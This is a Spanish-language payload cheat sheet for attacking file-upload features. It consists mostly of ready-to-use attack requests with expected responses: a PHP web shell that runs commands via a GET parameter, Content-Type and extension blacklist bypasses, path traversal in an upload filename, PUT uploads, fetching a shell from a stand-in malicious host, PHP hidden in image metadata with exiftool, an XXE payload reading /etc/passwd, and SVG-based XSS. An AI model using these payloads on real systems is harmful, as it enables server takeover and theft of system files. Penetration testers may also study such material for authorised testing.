# 📑 Real World Payloads

## Subida de Shells Web

### PHP Shell Básico

```php
<?php echo system($_GET['command']); ?>
```

### Uso del Shell

```http
GET /uploads/shell.php?command=id HTTP/1.1
Host: target.com
```

#### Respuesta esperada

```http
HTTP/1.1 200 OK
Content-Type: text/plain

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

## Explotar Validaciones Defectuosas

### Payload para Bypass de `Content-Type`

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: image/jpeg

<?php echo file_get_contents('/etc/passwd'); ?>
```

#### Respuesta esperada

```http
HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
...
```

***

## Bypass de Blacklists

### Payloads para Extensiones Ofuscadas

```
exploit.php.jpg
exploit.php.
exploit%00.php
exploit.php5
```

#### Respuesta esperada

```http
HTTP/1.1 200 OK
Content-Type: text/plain

Archivo subido correctamente.
```

***

## Path Traversal en la Subida

### Payload de Path Traversal

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="file"; filename="../../shell.php"
Content-Type: application/x-php

<?php echo system($_GET['command']); ?>
---------------------------012345678901234567890123456--
```

#### Respuesta esperada

```http
HTTP/1.1 200 OK
Content-Type: text/plain

Archivo subido correctamente.
```

***

## Subida de Archivos usando `PUT`

### Payload PUT

```http
PUT /uploads/shell.php HTTP/1.1
Host: target.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/etc/passwd'); ?>
```

#### Respuesta esperada

```http
HTTP/1.1 201 Created
```

***

## Subida Basada en URL

### Payload de URL

```http
POST /upload-url HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "url": "http://malicious-site.com/shell.php"
}
```

#### Respuesta esperada

```http
HTTP/1.1 200 OK
Content-Type: text/plain

Archivo descargado y subido correctamente.
```

***

## Validación del Contenido del Archivo

### Modificación con EXIFTOOL

```bash
exiftool -Comment="<?php echo file_get_contents('/etc/passwd'); ?>" image.jpg -o shell.jpg
```

#### Respuesta esperada

```http
HTTP/1.1 200 OK
Content-Type: text/plain

Contenido del archivo leído con éxito.
```

***

## Exploits en el Análisis de Archivos

### Payload XXE

```xml
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

#### Respuesta esperada

```http
HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
...
```

***

## Subida de Scripts para Ataques del Lado del Cliente

### Payload SVG con XSS

```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS');</script>
</svg>
```

#### Respuesta esperada

Cuando otro usuario visite la página donde se sirve el archivo:

```javascript
[ALERTA] XSS activado
```
